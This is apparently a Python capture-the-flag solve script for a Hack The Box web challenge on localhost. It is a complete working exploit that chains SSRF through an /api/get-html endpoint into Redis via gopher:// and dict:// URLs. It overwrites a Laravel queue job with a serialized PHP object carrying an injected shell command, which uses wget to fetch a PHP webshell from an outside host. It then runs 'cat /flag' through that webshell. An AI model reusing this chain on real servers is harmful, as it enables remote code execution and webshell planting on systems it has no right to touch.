import urllib.parse
import requests,re,urllib,time

ip_challenge = "http://localhost:1337"


# necessary to initiate the queue and the keys in the redis db
def send_first_msg():
    first = requests.post(f"{ip_challenge}/api/get-html", json={'site':'dict://127-0-0-1.nip.io:6379/info'})
    # file_response = response.json()['filename']
    # response = requests.get(f"{ip_challenge}/{file_response}")
    # print(response.text)

def generate_payload():
    # you need to escape the / in the url (put a duuble \ in the string so that redis gets a \\ to escape the /)
    command = r";cd public;wget https:\\/\\/gist.githubusercontent.com\\/joswr1ght\\/22f40787de19d80d110b37fb79ac3985\\/raw\\/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4\\/easy-simple-php-webshell.php;touch something"

    db_entry_sample = r"""{\"uuid\":\"a189b71f-3248-4da1-8d14-3715fa993e57\",\"displayName\":\"App\\\\Jobs\\\\rmFile\",\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"maxTries\":null,\"maxExceptions\":null,\"failOnTimeout\":false,\"backoff\":null,\"timeout\":null,\"retryUntil\":null,\"data\":{\"commandName\":\"App\\\\Jobs\\\\rmFile\",\"command\":\"O:15:\\\"App\\\\Jobs\\\\rmFile\\\":1:{s:9:\\\"fileQueue\\\";O:21:\\\"App\\\\Message\\\\FileQueue\\\":3:{s:8:\\\"filePath\\\";s:45:\\\"\\/src\\/955c2c12-5d28-4e77-bdf8-5519336d9758.txt\\\";s:4:\\\"uuid\\\";s:"""+str(36+len(command)-command.count("\\"))+r""":\\\"955c2c12-5d28-4e77-bdf8-5519336d9758"""+command+r"""\\\";s:3:\\\"ext\\\";s:3:\\\"txt\\\";}}\"},\"id\":\"n3b5scQzXL40UoEC6iXOsO3a4xS2kWcv\",\"attempts\":0}"""

    payload = f"gopher://127-0-0-1.nip.io:6379/_lset%20laravel_database_queues:default%200%20%22{urllib.parse.quote(db_entry_sample, safe=":")}%22"
    return payload

def get_flag(payload):
    requests.post(f"{ip_challenge}/api/get-html", json={'site':payload})
    count = 0
    while count < 15:
        response = requests.get(f"{ip_challenge}/easy-simple-php-webshell.php?cmd=cat+%2Fflag")
        if "HTB" in response.text:
            print("CONGRATULATIONS!")
            print(re.search("HTB{.*?}" ,response.text).group())
            return
        print(f"Failed to get flag after {count} min")
        count += 1
        time.sleep(60)
    

def main():
    send_first_msg()
    payload = generate_payload()
    get_flag(payload)

        

main()



    




generate_payload()